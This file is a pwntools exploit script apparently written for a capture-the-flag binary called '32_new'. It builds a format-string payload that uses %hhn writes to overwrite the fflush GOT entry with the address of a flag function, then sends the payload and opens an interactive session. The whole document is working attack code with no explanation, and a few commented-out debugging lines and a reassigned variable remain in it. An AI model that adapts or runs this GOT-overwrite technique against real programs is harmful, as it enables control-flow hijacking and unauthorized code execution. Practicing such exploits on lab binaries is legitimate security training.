from pwn import *
import struct

binary = context.binary = ELF("./32_new")

if args.GDB:
    p = gdb.debug(binary.path, gdbscript='b *main + 0xb3')
else:
    p = process(binary.path)

flush_got = 0x0804a028
flag_addr = 0x0804870b
flag_addr = 0x0b

payload = b""
payload += p32(flush_got)
payload += p32(flush_got+1)
payload += p32(flush_got+2)
payload += p32(flush_got+3)
# payload += b"%" + str(flag_addr).encode() + b"x"
# payload += b" %10$x %11$x %12$x"
payload += b"%181x%10$hhn"
payload += b"%124x%11$hhn"
payload += b"%125x%12$hhn"
payload += b"%260x%13$hhn"
# payload += b"0x%138$x 0x%139$x 0x%140$x  0x%141$x "
# payload += b"%hhn"

print(payload)

with open("payload", "wb") as fp:
    fp.write(payload)

p.sendline(payload)
p.interactive()